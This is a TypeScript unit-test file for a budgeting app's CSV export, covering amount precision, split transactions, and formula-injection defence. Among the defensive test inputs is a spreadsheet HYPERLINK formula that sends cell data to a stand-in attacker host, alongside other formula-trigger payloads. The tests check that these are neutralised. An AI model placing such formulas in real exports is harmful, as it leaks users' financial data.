import { parse as csvParse } from 'csv-parse/sync';

import { aqlQuery } from '#server/aql';
import * as prefs from '#server/prefs';

import { exportQueryToCSV, exportToCSV } from './export-to-csv';

vi.mock('#server/aql', () => ({ aqlQuery: vi.fn() }));

beforeEach(() => prefs.loadPrefs());

describe('exportToCSV', () => {
  const accounts = [{ id: 'a1', name: 'Checking' }];
  const categoryGroups = [
    { name: 'Income', categories: [{ id: 'c1', name: 'Salary' }] },
  ];

  function makeTransaction(overrides: Record<string, unknown> = {}) {
    return {
      account: 'a1',
      date: '2026-01-01',
      payee: 'p1',
      notes: '',
      category: 'c1',
      amount: 10000,
      cleared: false,
      reconciled: false,
      ...overrides,
    };
  }

  async function payeeCell(payeeName: string, amount = 10000) {
    const csv = await exportToCSV(
      [makeTransaction({ amount })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: payeeName }],
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    return { row: rows[0], csv };
  }

  it.each([
    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
    ['=1+1'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(1+1)'],
    ['\tHELLO'],
    ['\rHELLO'],
  ])('prefixes a payee starting with %j with a single quote', async payload => {
    const { row } = await payeeCell(payload);
    expect(row.Payee).toBe("'" + payload);
  });

  it('does not prefix payees without a leading trigger character', async () => {
    const { row } = await payeeCell('Acme Corp');
    expect(row.Payee).toBe('Acme Corp');
  });

  it('does not prefix negative numeric amounts', async () => {
    const { row } = await payeeCell('Acme', -2500);
    expect(row.Amount).toBe('-25');
  });

  it.each([
    [undefined, '12.34'],
    [0, '1234'],
    [2, '12.34'],
    [3, '1.234'],
  ])('exports recorded precision %s', async (precision, expected) => {
    if (precision !== undefined) {
      await prefs.savePrefs({
        amountEncoding: JSON.stringify({
          version: 1,
          currencyCode: 'USD',
          precision,
        }),
      });
    }

    const { row } = await payeeCell('Acme', 1234);
    expect(row.Amount).toBe(expected);
  });

  it('exports an empty transaction set', async () => {
    const csv = await exportToCSV([], accounts, categoryGroups, []);
    expect(csv).toBe('');
  });

  it('rejects invalid recorded encoding', async () => {
    await prefs.savePrefs({ amountEncoding: '{"version":2}' });
    await expect(payeeCell('Acme')).rejects.toThrow(
      'amount-encoding-unsupported',
    );
  });
});

describe('exportQueryToCSV', () => {
  it('formats parent and child split rows at the recorded precision', async () => {
    await prefs.savePrefs({
      amountEncoding: JSON.stringify({
        version: 1,
        currencyCode: 'KWD',
        precision: 3,
      }),
    });
    vi.mocked(aqlQuery).mockResolvedValue({
      dependencies: [],
      data: [
        { Id: 1, IsParent: true, Amount: -1234 },
        { Id: 2, ParentId: 1, IsChild: true, Amount: -1234 },
      ],
    });

    const rows = csvParse(
      await exportQueryToCSV({
        select: () => ({ options: () => ({}) }),
      }),
      { columns: true },
    ) as Array<Record<string, string>>;

    expect(rows[0].Amount).toBe('0');
    expect(rows[0].Split_Amount).toBe('-1.234');
    expect(rows[1].Amount).toBe('-1.234');
    expect(rows[1].Split_Amount).toBe('0');
  });
});
